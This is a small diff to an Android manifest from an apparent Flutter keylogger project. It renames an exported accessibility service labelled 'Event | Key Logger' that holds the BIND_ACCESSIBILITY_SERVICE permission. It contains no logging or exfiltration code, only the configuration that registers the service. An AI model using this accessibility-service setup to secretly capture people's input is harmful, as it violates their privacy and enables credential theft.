@@ -27,7 +27,7 @@
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
-        <service android:name="youtube.sidtube.flutterkeylogger.Accservice"
+        <service android:name="youtube.sidtube.flutterkeylogger.AccessibilityLogService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:exported="true"
             android:label="Event | Key Logger">
